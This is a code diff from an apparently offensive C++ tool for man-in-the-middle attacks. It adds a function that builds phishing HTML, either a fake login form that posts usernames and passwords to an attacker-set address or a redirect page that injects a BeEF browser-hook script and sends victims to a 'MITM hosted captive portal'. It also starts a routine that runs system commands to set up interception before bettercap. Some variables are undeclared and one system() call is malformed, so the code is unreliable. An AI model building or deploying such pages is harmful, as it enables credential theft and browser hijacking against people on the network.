@@ -1,5 +1,5 @@
 #include "everythingelse.hpp"
-bool INPUT_FLAG;
+
 
 void termcolorprint(std::string color, std::string text) {
     if (color == "red"){
@@ -26,12 +26,52 @@ void errprint(auto err) {
 };
 
 void shutdown_server(){
-    INPUT_FLAG = false;
     std::string message("SHUTTING DOWN");
     update_window(stdscr, message);
     refresh();
-
 };
+
+/**
+returns a string containing the html needed to make wither a redirect or form with
+ beefhook location and formaction as the first and second parameters respectively.
+ both strings;
+ @param hook_loc Beef Hook Location
+ @param form_action Form Action
+ @param form_or_redirect, true to return redirect, false to return form
+ @return The html you need when the xenomorphs come calling
+
+*/
+std::string make_html(std::string hook_loc, std::string formaction, bool form_or_redirect) {
+    std::string html_redirect_body;
+    std::string html_form_body;
+    std::string hook_location;
+    std::string html_login_head ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
+    std::string html_form_body_top = "<body><form class=\"login\" ";
+    std::string form_action = "action=\"" + formaction + "\" ";
+    std::string html_form_body_bottom = " method=\"post\">\
+        <input type=\"text\" name=\"username\" value=\"username\">\
+        <input type=\"text\" name=\"password\" value=\"password\">\
+        <input type=\"submit\" name=\"submit\" value=\"submit\">\
+        </form>\
+        </body>\
+        </html>";
+    std::string html_redirect_head = "<html><head>";
+    beef_hook = "<script src=" + hook_loc + "></script>";
+    std::string html_redirect_middle = "<meta http-equiv=\"refresh\" content=\"0; url=http://" + redirect_ip + "\" />";
+    std::string redirect_bottom = "</head><body><b>Redirecting to MITM hoasted captive portal page</b></body></html>";
+    if (form_or_redirect == true) {
+        html_redirect_body = html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
+        return html_redirect_body;
+    } else if (form_or_redirect == false ) {
+        html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
+        return html_form_body;
+    };
+};
+
+/**
+Sets up IPtables rules and other necessary things before running bettercap and/or other MITM
+methods
+*/
 int establish_MITM(std::string netiface, std::string ip_addr, std::string port){
 
     system(("ip link set %i down", netiface).c_str());
